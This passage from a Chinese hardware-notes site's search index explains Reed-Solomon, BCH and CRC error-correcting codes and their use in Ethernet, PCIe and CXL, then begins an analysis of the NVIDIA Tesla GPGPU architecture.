\u200b\u7f16\u7801\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b\u9700\u8981\u200b\uff0c\u200b\u8bbe\u7f6e\u200b\u4e0d\u540c\u200b\u7684\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u4e0d\u540c\u200b\u7684\u200b\u68c0\u9519\u200b\u548c\u200b\u7ea0\u9519\u200b\u80fd\u529b\u200b\u3002\u200b\u66f4\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u5982\u679c\u200b\u9519\u8bef\u200b\u4f1a\u200b\u8fde\u7eed\u200b\u51fa\u73b0\u200b\uff08erasure\uff09\uff0c\u200b\u7531\u4e8e\u200b\u4f20\u8f93\u200b\u7684\u200b\u662f\u200b\u591a\u4e2a\u200b\u503c\u200b\uff0c\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b\u503c\u200b\u4ea7\u751f\u200b\u7684\u200b\u591a\u4e2a\u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\u548c\u200b\u4e00\u4e2a\u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\u662f\u200b\u4e00\u6837\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fde\u7eed\u200b\u9519\u8bef\u200b\u7684\u200b\u7ea0\u9519\u200b\u80fd\u529b\u200b\u66f4\u5f3a\u200b\u3002</p> <p>\u200b\u9664\u4e86\u200b\u4e0a\u9762\u200b\u8fd9\u79cd\u200b\u628a\u200b\u6570\u636e\u7f16\u7801\u200b\u4e3a\u200b\u591a\u9879\u5f0f\u200b\u7cfb\u6570\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u7528\u200b\u5176\u4ed6\u200b\u65b9\u5f0f\u200b\u3002\u200b\u4f8b\u5982\u200b\u628a\u200b\u6570\u636e\u200b\u8bbe\u5b9a\u200b\u4e3a\u200b\u591a\u9879\u5f0f\u200b\u5728\u200b \\(k\\) \u200b\u4e2a\u70b9\u200b\u4e0a\u200b\u7684\u200b\u53d6\u503c\u200b\uff0c\u200b\u5176\u4f59\u200b\u7684\u200b\u70b9\u200b\u7684\u200b\u503c\u200b\u901a\u8fc7\u200b\u62c9\u683c\u6717\u200b\u65e5\u200b\u63d2\u503c\u6cd5\u200b\u8ba1\u7b97\u200b\u5f97\u51fa\u200b\u3002\u200b\u8fd9\u6837\u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\u7f16\u7801\u200b\u4ee5\u540e\u200b\uff0c\u200b\u6570\u636e\u200b\u4f1a\u200b\u539f\u6837\u200b\u4fdd\u7559\u200b\u4e0b\u6765\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u9884\u5148\u200b\u8bbe\u5b9a\u200b\u4e00\u4e2a\u200b\u591a\u9879\u5f0f\u200b \\(g(x)\\)\uff0c\u200b\u7f16\u7801\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8ba1\u7b97\u200b \\(s(x)=p(x)g(x)\\)\uff0c\u200b\u7136\u540e\u200b\u4f20\u8f93\u200b \\(s(x)\\) \u200b\u7684\u200b \\(n\\) \u200b\u4e2a\u200b\u7cfb\u6570\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u53eb\u505a\u200b BCH\uff08Bose\u2013Chaudhuri\u2013Hocquenghem\uff09\u3002</p> <p>\u200b\u5b9e\u8df5\u200b\u4e2d\u200b\u4f7f\u7528\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7531\u4e8e\u200b\u8ba1\u7b97\u673a\u200b\u4f20\u8f93\u200b\u65f6\u200b\u6bcf\u4e2a\u200b\u5b57\u8282\u200b\u6709\u200b 256 \u200b\u79cd\u200b\u53d6\u503c\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5982\u679c\u200b\u7528\u200b\u7d20\u6570\u200b \\(q\\) \u200b\u6765\u200b\u9650\u5236\u200b\u5b57\u6bcd\u8868\u200b\u5927\u5c0f\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u8981\u6c42\u200b \\(q\\) \u200b\u662f\u200b\u6bd4\u200b 256 \u200b\u5927\u200b\u7684\u200b\u7d20\u6570\u200b\uff0c\u200b\u4f1a\u200b\u6709\u6240\u200b\u6d6a\u8d39\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u5e38\u7528\u200b\u5927\u5c0f\u200b\u4e3a\u200b 256 \u200b\u7684\u200b Galois Field \u200b\u6765\u200b\u66ff\u4ee3\u200b\u7d20\u6570\u200b\u57df\u200b\uff0c\u200b\u4e0a\u9762\u200b\u591a\u9879\u5f0f\u200b\u4e2d\u200b\u7684\u200b\u8fd0\u7b97\u200b\u90fd\u200b\u66ff\u6362\u200b\u4e3a\u200b Galois Field \u200b\u4e2d\u200b\u5bf9\u5e94\u200b\u7684\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u6b64\u65f6\u200b\u4e00\u4e2a\u200b\u7b26\u53f7\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u3002\u200b\u4f8b\u5982\u200b RS(255,223) \u200b\u7801\u200b\uff088 \u200b\u4f4d\u200b\u7b26\u53f7\u200b\uff09\u200b\u5c31\u662f\u200b\u6bcf\u200b 223 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u5206\u4e3a\u200b\u4e00\u7ec4\u200b\uff0c\u200b\u7f16\u7801\u200b\u4e3a\u200b 255 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7ea0\u6b63\u200b 16 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u9519\u8bef\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u5e0c\u671b\u200b\u7f29\u51cf\u200b \\(n\\)\uff0c\u200b\u53ef\u4ee5\u200b\u586b\u5145\u200b\u4e00\u90e8\u5206\u200b\u5b57\u8282\u200b\uff0c\u200b\u4f8b\u5982\u200b RS(200,168) \u200b\u7801\u200b\uff0c\u200b\u7ed9\u200b\u6570\u636e\u200b\u586b\u5145\u200b 55 \u200b\u4e2a\u200b\u96f6\u5b57\u200b\u8282\u540e\u200b\uff0c\u200b\u518d\u200b\u6309\u7167\u200b RS(255,223) \u200b\u8fdb\u884c\u200b\u7f16\u7801\u200b\uff0c\u200b\u5f97\u5230\u200b 32 \u200b\u4e2a\u200b\u6821\u9a8c\u200b\u5b57\u8282\u200b\uff0c\u200b\u4f20\u8f93\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u200b\u4f20\u8f93\u200b 168+32 \u200b\u4e2a\u200b\u5b57\u8282\u200b\uff0c\u200b\u6b64\u65f6\u200b\u8981\u6c42\u200b\u5728\u200b Reed Solomon \u200b\u7f16\u7801\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u91c7\u7528\u200b\u4fdd\u7559\u200b\u539f\u59cb\u6570\u636e\u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aReed-Solomon error correction</p>"},{"location":"hardware/error_detection_correction_code.html#crc","title":"CRC","text":"<p>CRC \u200b\u662f\u200b\u628a\u200b\u6570\u636e\u200b\u5f53\u6210\u200b\u4e00\u4e2a\u200b GF(2) \u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u7cfb\u6570\u200b\uff0c\u200b\u9664\u4ee5\u200b\u5df2\u77e5\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b\u4f59\u6570\u200b\u5c31\u662f\u200b CRC \u200b\u7684\u200b\u7ed3\u679c\u200b\u3002CRC \u200b\u4e3b\u8981\u200b\u662f\u200b\u4e3a\u4e86\u200b\u68c0\u6d4b\u200b\u9519\u8bef\u200b\uff0c\u200b\u4f46\u200b\u5728\u200b\u7279\u5b9a\u6761\u4ef6\u200b\u4e0b\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7ea0\u6b63\u9519\u8bef\u200b\uff0c\u200b\u4f46\u200b CRC \u200b\u4e3b\u8981\u200b\u8fd8\u662f\u200b\u7528\u6765\u200b\u68c0\u6d4b\u200b\u9519\u8bef\u200b\u3002\u200b\u6b64\u5916\u200b\uff0cCRC \u200b\u4e0d\u200b\u8981\u6c42\u200b\u6570\u636e\u200b\u957f\u5ea6\u200b\u56fa\u5b9a\u200b\u3002</p>"},{"location":"hardware/error_detection_correction_code.html#_4","title":"\u5c0f\u7ed3","text":"<p>\u200b\u4e0b\u9762\u200b\u7ed9\u51fa\u200b\u4e0d\u540c\u200b\u68c0\u9519\u200b\u7ea0\u9519\u7801\u200b\u7684\u200b\u5bf9\u6bd4\u200b\uff1a</p> \u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b \u200b\u6570\u636e\u200b\u4f4d\u6570\u200b \u200b\u5197\u4f59\u200b\u4f4d\u6570\u200b \u200b\u603b\u200b\u4f4d\u6570\u200b \u200b\u5947\u5076\u6821\u9a8c\u200b \\(2\\) \\(n\\) \\(1\\) \\(n+1\\) \u200b\u91cd\u590d\u200b\u7f16\u7801\u200b \\(n\\) \\(1\\) \\(n-1\\) \\(n\\) Hamming \u200b\u7801\u200b \\(3\\) \\(2^r-r-1\\) r \\(2^r-1\\) \u200b\u6269\u5c55\u200b Hamming \u200b\u7801\u200b \\(4\\) \\(2^r-r-1\\) \\(r+1\\) \\(2^r\\) Reed Solomon \\(n-k+1\\) \\(k\\log_2(q)\\) \\((n-k)\\log_2(q)\\) \\(n\\log_2(q)\\)"},{"location":"hardware/error_detection_correction_code.html#_5","title":"\u5b9e\u8df5","text":"<p>\u200b\u5f88\u591a\u200b\u534f\u8bae\u200b\u91c7\u7528\u200b\u4e86\u200b\u68c0\u9519\u200b\u7ea0\u9519\u7801\u200b\u6765\u200b\u4fdd\u8bc1\u6570\u636e\u200b\u7684\u200b\u53ef\u9760\u6027\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ol> <li>\u200b\u4ee5\u592a\u7f51\u200b FCS\uff08Frame Check Sequence\uff09\uff1a4 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u4fdd\u62a4\u200b\u4e00\u4e2a\u200b MTU \u200b\u52a0\u200b\u5934\u90e8\u200b\u5927\u5c0f\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>IP\uff08Internet Protocol\uff09\uff1a2 \u200b\u5b57\u8282\u200b\u7684\u200b Internet Checksum\uff0c\u200b\u4fdd\u62a4\u200b\u4e00\u4e2a\u200b IP \u200b\u5934\u90e8\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>PCIe TLP\uff08Transaction Layer Packet\uff09\uff1a4 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u4fdd\u62a4\u200b\u4e00\u4e2a\u200b TLP \u200b\u7684\u200b\u6570\u636e\u200b</li> <li>PCIe DLLP\uff08Data Link Layer Packet\uff09\uff1a2 \u200b\u6216\u200b 4 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u4fdd\u62a4\u200b\u4e00\u4e2a\u200b DLLP \u200b\u7684\u200b\u6570\u636e\u200b</li> <li>CXL 68B FLIT\uff1a2 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u4fdd\u62a4\u200b 64 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>CXL Standard 256B FLIT\uff1a8 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c6 \u200b\u5b57\u8282\u200b\u7684\u200b FEC\uff0c\u200b\u4fdd\u62a4\u200b 242 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>CXL Latency Optimized 256B FLIT\uff1a\u200b\u524d\u534a\u90e8\u200b\u5206\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b CRC \u200b\u4fdd\u62a4\u200b 122 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u540e\u200b\u534a\u200b\u90e8\u5206\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b CRC \u200b\u4fdd\u62a4\u200b 116 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff1b\u200b\u6700\u540e\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b FEC \u200b\u4fdd\u62a4\u200b\u5b8c\u6574\u200b\u7684\u200b FLIT</li> </ol>"},{"location":"hardware/error_detection_correction_code.html#_6","title":"\u53c2\u8003\u200b\u6587\u6863","text":"<ul> <li>Error correction code</li> </ul>"},{"location":"hardware/gpgpu.html","title":"GPGPU (General Purpose Graphics Processing Unit)","text":"<p>GPGPU \u200b\u662f\u200b General Purpose Graphics Processing Unit \u200b\u7684\u200b\u7f29\u5199\u200b\uff0c\u200b\u610f\u601d\u200b\u662f\u200b\u652f\u6301\u200b\u901a\u7528\u200b\u7528\u9014\u200b\u7684\u200b\u56fe\u5f62\u200b\u5904\u7406\u5355\u5143\u200b\uff0c\u200b\u662f\u200b\u5728\u200b\u663e\u5361\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u901a\u8fc7\u200b CUDA \u200b\u7b49\u200b\u7f16\u7a0b\u200b\u63a5\u53e3\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u5bf9\u200b\u663e\u5361\u200b\u8fdb\u884c\u200b\u7f16\u7a0b\u200b\uff0c\u200b\u5728\u200b\u663e\u5361\u200b\u4e0a\u200b\u6267\u884c\u200b\u81ea\u5b9a\u4e49\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u5206\u6790\u200b\u4e00\u4e9b\u200b\u7ecf\u5178\u200b\u7684\u200b GPGPU \u200b\u7684\u200b\u67b6\u6784\u200b\u3002</p>"},{"location":"hardware/gpgpu.html#nvidia-tesla","title":"NVIDIA Tesla","text":"<p>\u200b\u8bba\u6587\u200b\uff1aE. Lindholm, J. Nickolls, S. Oberman and J. Montrym, \"NVIDIA Tesla: A Unified Graphics and Computing Architecture,\" in IEEE Micro, vol. 28, no. 2, pp. 39-55, March-April 2008, doi: 10.1109/MM.2008.31.</p> <p>NVIDIA Tesla \u200b\u67b6\u6784\u200b\u662f\u200b\u7b2c\u4e00\u4ee3\u200b\u652f\u6301\u200b CUDA \u200b\u7684\u200b NVIDIA \u200b\u663e\u5361\u200b\u67b6\u6784\u200b\uff0c\u200b\u4e5f\u200b\u662f\u4ece\u200b\u7eaf\u7cb9\u200b\u7684\u200b\u663e\u5361\u200b\u5230\u200b\u652f\u6301\u200b\u901a\u7528\u200b\u8ba1\u7b97\u200b\u7684\u200b GPGPU \u200b\u8f6c\u53d8\u200b\u7684\u200b\u5f00\u59cb\u200b\u3002</p> <p>\u200b\u4f20\u7edf\u200b\u7684\u200b\u663e\u5361\u200b\u6267\u884c\u200b\u7684\u200b\u662f\u200b\u56fa\u5b9a\u200b\u7684\u200b\u6d41\u7a0b\u200b\uff0c\u200b\u5982\u679c\u200b\u5b66\u4e60\u200b\u8fc7\u200b OpenGL\uff0c\u200b\u4f1a\u200b\u77e5\u9053\u200b\u56fe\u5f62\u200b\u6e32\u67d3\u200b\u4f1a\u200b\u91c7\u7528\u200b Graphics Pipeline\uff0c\u200b\u6240\u4ee5\u200b\u663e\u5361\u200b\u4e5f\u200b\u662f\u200b\u9488\u5bf9\u200b\u8fd9\u4e2a\u200b Pipeline \u200b\u53bb\u200b\u5b9e\u73b0\u200b\u7684\u200b\u3002\u200b\u8fd9\u4e2a\u200b Pipeline \u200b\u4e2d\u200b\u7684\u200b vertex shader \u200b\u548c\u200b fragment shader \u200b\u90e8\u5206\u200b\u5df2\u7ecf\u200b\u6709\u200b\u4e86\u200b\u53ef\u7f16\u7a0b\u200b\u7684\u200b\u80fd\u529b\u200b\uff0c\u200b\u6240\u4ee5\u200b\u65e9\u671f\u200b\u7684\u200b GPU \u200b\u5c31\u200b\u5206\u522b\u200b\u7ed9\u200b\u8fd9\u200b\u4e24\u200b\u90e8\u5206\u200b\u8bbe\u8ba1\u200b\u5904\u7406\u5668\u200b\uff0c\u200b\u6240\u4ee5\u200b GPU \u200b\u91cc\u9762\u200b\u65e2\u6709\u200b vertex processor\uff0c\u200b\u53c8\u200b\u6709\u200b pixel-fragment processor\u3002\u200b\u5206\u5f00\u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\u53ef\u4ee5\u200b\u5206\u522b\u200b\u4f18\u5316\u200b\uff0c\u200b\u7f3a\u70b9\u200b\u662f\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b processor \u200b\u4efb\u52a1\u91cf\u200b\u4e0d\u200b\u5339\u914d\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u786c\u4ef6\u8d44\u6e90\u200b\u7684\u200b\u6d6a\u8d39\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b Tesla \u200b\u7684\u200b\u8bbe\u8ba1\u200b\u76ee\u7684\u200b\u5c31\u662f\u200b\u7528\u200b\u4e00\u4e2a\u200b\u5355\u72ec\u200b\u7684\u200b processor \u200b\u5b8c\u6210\u200b\u6240\u6709\u200b\u53ef\u7f16\u7a0b\u200b\u7684\u200b\u4efb\u52a1\u200b\uff0c\u200b\u65e2\u200b\u53ef\u4ee5\u200b\u5b8c\u6210\u200b\u5df2\u6709\u200b\u7684\u200b vertex shader \u200b\u548c\u200b fragment shader \u200b\u7684\u200b\u6267\u884c\u200b\uff0c\u200b\u53c8\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u672a\u6765\u200b Graphics Pipeline \u200b\u53ef\u80fd\u200b\u4f1a\u200b\u589e\u52a0\u200b\u7684\u200b\u65b0\u200b\u7684\u200b shader \u200b\u7c7b\u578b\u200b\uff0c\u200b\u4f8b\u5982\u200b\u8bba\u6587\u200b\u4e2d\u200b\u63d0\u5230\u200b\u7684\u200b DX10 \u200b\u5f15\u5165\u200b\u7684\u200b geometry shader\u3002\u200b\u5982\u200b\u4e0d\u200b\u505a\u200b\u5408\u5e76\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6bcf\u6b21\u200b\u56fe\u5f62\u200b API \u200b\u8981\u200b\u6dfb\u52a0\u200b shader\uff0c\u200b\u786c\u4ef6\u200b\u5c31\u8981\u200b\u52a0\u200b\u4e00\u4e2a\u200b\u5355\u72ec\u200b\u7684\u200b\u5355\u5143\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u590d\u6742\u5ea6\u200b\u4e0d\u53ef\u200b\u63a5\u53d7\u200b\uff0c\u200b\u800c\u4e14\u200b\u65e7\u200b\u786c\u4ef6\u200b\u4e5f\u200b\u6ca1\u200b\u529e\u6cd5\u200b\u517c\u5bb9\u200b\u65b0\u200b\u7684\u200b API\u3002\u200b\u5408\u5e76\u200b\u4e86\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5982\u679c\u200b\u5408\u5e76\u200b\u4ee5\u540e\u200b\u7684\u200b processor \u200b\u8db3\u591f\u200b\u901a\u7528\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u5404\u79cd\u200b shader\uff0c\u200b\u81f3\u5c11\u200b\u8ba1\u7b97\u80fd\u529b\u200b\u4e0a\u200b\u4e0d\u4f1a\u200b\u6709\u200b\u95ee\u9898\u200b\uff0c\u200b\u53ea\u662f\u200b\u8bf4\u200b\u662f\u5426\u200b\u9700\u8981\u200b\u9488\u5bf9\u200b\u67d0\u4e9b\u200b shader \u200b\u53bb\u200b\u505a\u200b\u4f18\u5316\u200b\u3002</p> <p>\u200b\u65e2\u7136\u200b\u786e\u5b9a\u200b\u4e86\u200b\u8981\u200b\u7528\u200b\u4e00\u4e2a\u200b\u5355\u72ec\u200b\u7684\u200b processor \u200b\u6765\u200b\u5b8c\u6210\u200b\u6240\u6709\u200b\u7684\u200b\u53ef\u7f16\u7a0b\u200b\u7684\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u4e0b\u9762\u200b\u5c31\u200b\u6765\u200b\u4ecb\u7ecd\u200b\u8fd9\u4e2a\u200b processor \u200b\u662f\u200b\u600e\u4e48\u200b\u5b9e\u73b0\u200b\u7684\u200b\u3002\u200b\u4ee5\u200b GeForce 8800 GPU (G80) \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5b83\u200b\u6709\u200b 8 \u200b\u4e2a\u200b Texture Processor Cluster (TPC)\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u5185\u90e8\u200b\u6709\u200b\u4e24\u4e2a\u200b Streaming Multiprocessor\uff08SM\uff09\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u91cc\u9762\u200b\u6709\u200b 8 \u200b\u4e2a\u200b Streaming Processor\uff08SP\uff09\u3002\uff08<code>a GeForce 8800 GPU with 128 streaming-processor (SP) cores organized as 16 streaming multiprocessors (SMs) in eight independent processing units called texture/processor clusters (TPCs).</code>\uff09\u200b\u800c\u200b\u5177\u4f53\u200b\u6267\u884c\u200b\u8ba1\u7b97\u200b\u7684\u200b\u5c31\u662f\u200b SP\uff0c\u200b\u8fdb\u884c\u200b\u6574\u6570\u200b\u3001\u200b\u6d6e\u70b9\u8fd0\u7b97\u200b\u7b49\u7b49\u200b\u3002\u200b\u67b6\u6784\u56fe\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> Tesla \u200b\u67b6\u6784\u200b\u603b\u89c8\u200b\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA Tesla: A Unified Graphics and Computing Architecture Figure 1\uff09 <p>\u200b\u56fe\u200b\u7684\u200b\u4e0a\u65b9\u200b\u662f\u200b Host CPU\uff0cCPU \u200b\u901a\u8fc7\u200b PCIe \u200b\u7b49\u200b\u65b9\u5f0f\u200b\u8bbf\u95ee\u200b GPU\u3002\u200b\u6839\u636e\u200b\u8981\u200b\u8fdb\u884c\u200b\u7684\u200b\u4efb\u52a1\u200b\u7c7b\u578b\u200b\uff0c\u200b\u7ecf\u8fc7\u200b\u4e0d\u540c\u200b\u7c7b\u578b\u200b\u7684\u200b\u9884\u5904\u7406\u200b\uff0c\u200b\u4f46\u200b\u6700\u7ec8\u200b Vertex/Pixel/Compute \u200b\u4efb\u52a1\u200b\u90fd\u200b\u4f1a\u200b\u901a\u8fc7\u200b Streaming Processor Array (SPA)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b TPC-SM-SP \u200b\u4e09\u200b\u5c42\u6b21\u200b\u7ec4\u6210\u200b\u7684\u200b\u5927\u91cf\u200b\u8ba1\u7b97\u200b\u6838\u5fc3\u200b\u6765\u200b\u8fdb\u884c\u200b\u3002\u200b\u8fd9\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b\u524d\u9762\u200b\u8bf4\u200b\u7684\u200b\uff0c\u200b\u628a\u200b\u539f\u6765\u200b\u5206\u522b\u200b\u5b8c\u6210\u200b\u7684\u200b\u4efb\u52a1\u200b\uff0c\u200b\u7edf\u4e00\u200b\u5230\u200b\u76f8\u540c\u200b\u7684\u200b processor \u200b\u6765\u200b\u5b8c\u6210\u200b\u3002\u200b\u9664\u4e86\u200b\u8ba1\u7b97\u200b\u4ee5\u5916\u200b\uff0c\u200b\u9488\u5bf9\u200b texture \u200b\u548c\u200b raster \u200b\u7b49\u200b\u56fe\u5f62\u200b\u76f8\u5173\u200b\u7684\u200b\u9700\u6c42\u200b\uff0c\u200b\u8bbe\u8ba1\u200b\u4e86\u200b\u5355\u72ec\u200b\u7684\u200b\u786c\u4ef6\u200b\u6765\u200b\u52a0\u901f\u200b\uff0c\u200b\u4f8b\u5982\u200b\u6bcf\u4e2a\u200b TPC \u200b\u90fd\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b Texture unit \u200b\u548c\u200b Texture L1\uff0c\u200b\u5728\u200b L2 Slice \u200b\u65c1\u8fb9\u200b\u8fd8\u6709\u200b Raster operation processor (ROP)\u3002\u200b\u867d\u7136\u200b\u6709\u200b L2 \u200b\u7f13\u5b58\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u4ec5\u200b\u7528\u4e8e\u200b\u7eb9\u7406\u200b\u5904\u7406\u200b\uff0c\u200b\u800c\u200b\u6ca1\u6709\u200b\u7528\u4e8e\u200b SPA\u3002</p> <p>\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u6846\u67b6\u200b\u4e0b\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u53bb\u200b\u5b9e\u73b0\u200b Graphics Pipeline \u200b\u4e86\u200b\u3002\u200b\u56fe\u4e2d\u200b\u7684\u200b Input assembler \u200b\u6536\u96c6\u200b vertex shader \u200b\u8ba1\u7b97\u200b\u9700\u8981\u200b\u7684\u200b\u5404\u79cd\u200b\u56fe\u5f62\u200b\u4fe1\u606f\u200b\uff0c\u200b\u7136\u540e\u200b Vertex work distribution \u200b\u901a\u8fc7\u200b round-robin \u200b\u7684\u200b\u65b9\u5f0f\u200b \u200b\u628a\u200b vertex shader \u200b\u8ba1\u7b97\u200b\u4efb\u52a1\u200b\u5206\u53d1\u200b\u5230\u200b SPA \u200b\u4e0a\u200b\u3002\u200b\u4e8e\u662f\u200b SPA \u200b\u5c31\u200b\u4f1a\u200b\u6267\u884c\u200b vertex shader \u200b\u7684\u200b\u4ee3\u7801\u200b\u3002vertex shader \u200b\u7684\u200b\u8f93\u51fa\u200b\u4f1a\u200b\u7ee7\u7eed\u200b\u7559\u5728\u200b GPGPU \u200b\u4e0a\u200b\uff0c\u200b\u5230\u200b pixel-fragment processing \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53c8\u200b\u662f\u200b\u7531\u200b SPA \u200b\u6765\u200b\u6267\u884c\u200b fragment shader \u200b\u7684\u200b\u4ee3\u7801\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u63a5\u4e0b\u6765\u200b\u6765\u770b\u200b TPC \u200b\u7684\u200b\u5185\u90e8\u200b\u67b6\u6784\u200b\u3002</p> <p> </p> Tesla TPC \u200b\u67b6\u6784\u200b\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA Tesla: A Unified Graphics and Computing Architecture Figure 2\uff09 <p>\u200b\u6bcf\u4e2a\u200b TPC \u200b\u5305\u62ec\u200b\u4e00\u4e2a\u200b Geometry controller \u200b\u548c\u200b\u4e00\u4e2a\u200b SM Controller (SMC)\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u4e24\u4e2a\u200b SM\uff0c\u200b\u6700\u540e\u200b\u662f\u200b Texture unit \u200b\u548c\u200b\u5b83\u200b\u5185\u90e8\u200b\u7684\u200b Texture L1\u3002\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 8 \u200b\u4e2a\u200b SP\u3002Geometry controller \u200b\u662f\u200b\u7528\u4e8e\u200b\u914d\u5408\u200b vertex shader \u200b\u548c\u200b geometry shader \u200b\u7684\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u4e0d\u200b\u6df1\u5165\u5206\u6790\u200b\u4e86\u200b\u3002\u200b\u4e0b\u9762\u200b\u4e3b\u8981\u200b\u5206\u6790\u200b SM\u3002</p> <p>SM \u200b\u662f\u200b\u6267\u884c\u200b\u8ba1\u7b97\u200b\u7684\u200b\u4e3b\u8981\u200b\u90e8\u4ef6\u200b\uff0c\u200b\u5185\u90e8\u200b\u6709\u200b 8 \u200b\u4e2a\u200b SP\uff0c\u200b\u4e24\u4e2a\u200b Special Function Unit\uff08SFU\uff0c\u200b\u7528\u4e8e\u200b\u8ba1\u7b97\u200b\u4e09\u89d2\u51fd\u6570\u200b\u7b49\u200b\u7279\u6b8a\u200b\u6570\u5b66\u200b\u51fd\u6570\u200b\u4ee5\u53ca\u200b\u63d2\u503c\u200b\uff09\uff0c\u200b\u4e00\u4e2a\u200b\u591a\u7ebf\u7a0b\u200b\u7684\u200b\u53d6\u6307\u4ee4\u200b\u548c\u200b Issue \u200b\u5355\u5143\u200b\uff08MT Issue\uff09\uff0c\u200b\u4e00\u4e2a\u200b\u6307\u4ee4\u200b\u7f13\u5b58\u200b\uff08I Cache\uff09\uff0c\u200b\u4e00\u4e2a\u200b\u5e38\u91cf\u200b\u7f13\u5b58\u200b\uff08C Cache\uff09\u200b\u548c\u200b 16 KB \u200b\u7684\u200b\u5171\u4eab\u5185\u5b58\u200b\uff08Shared memory\uff09\u3002\u200b\u6ce8\u610f\u200b SM \u200b\u5185\u90e8\u200b\u6ca1\u6709\u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\u3002\u200b\u6bcf\u4e2a\u200b SP \u200b\u5305\u62ec\u200b\u4e00\u4e2a\u200b\u6d6e\u70b9\u200b\u4e58\u52a0\u200b\u5355\u5143\u200b\uff08MAD\uff0cMultiply Add\uff0c\u200b\u6ca1\u6709\u200b\u4e58\u52a0\u200b\u878d\u5408\u200b\uff09\uff0c\u200b\u6bcf\u4e2a\u200b SFU \u200b\u5305\u62ec\u200b\u56db\u4e2a\u200b\u6d6e\u70b9\u200b\u4e58\u6cd5\u5668\u200b\u3002SP \u200b\u5de5\u4f5c\u200b\u5728\u200b 1.5 GHz 